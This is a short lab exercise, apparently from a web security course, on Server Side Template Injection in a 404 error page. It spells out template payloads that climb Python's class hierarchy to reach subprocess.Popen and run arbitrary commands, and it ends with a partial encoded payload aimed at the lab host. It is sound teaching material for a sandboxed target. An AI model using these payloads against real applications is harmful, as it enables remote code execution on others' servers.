Server Side Template Injection 01

This exercise was inspired by the following Hackerone report: https://hackerone.com/reports/125980.
 In this exercise, the bug is located in the 404 error management.

This report gives you the foundation to:

    Test {{'7'*7}}
    Get code execution:

{{''.__class__.mro()[1].__subclasses__()}} 

 Check the report carefully, as you can see that the `__` are hidden due to the processing of the data as Markdown in the initial report. 

 You may need to change the value 1 to get the list of interesting functions. Once you get it, you will need to find one that will give you code execution. You can use the following payload to get access to <class 'subprocess.Popen'>:

{{''.__class__.mro()[1].__subclasses__()[X]}}

Where X is the integer you need to find.

Finally, you can call this method using:

{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}

Where:

    * X was found previously.
    * COMMAND is the command you want to run.

     Make sure you read the Python documentation for the popen to make sure you have get the right syntax for the command (or add the right option). 

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:

/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

 You can access this exercise using the following URL: http://ptc-d4302d41-37500401.libcurl.so/. 

 
Common Mistakes:

   * Make sure you use 2 singles quotes ('') instead of 1 double quote (") at the start of the payload
   * Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

   Steps: 
    1) 

http://ptc-8b80bc40-a5b9a89a.libcurl.so//Test%20%7B%7B''.__class__.mro()[2].__subclasses__()%7D%7D

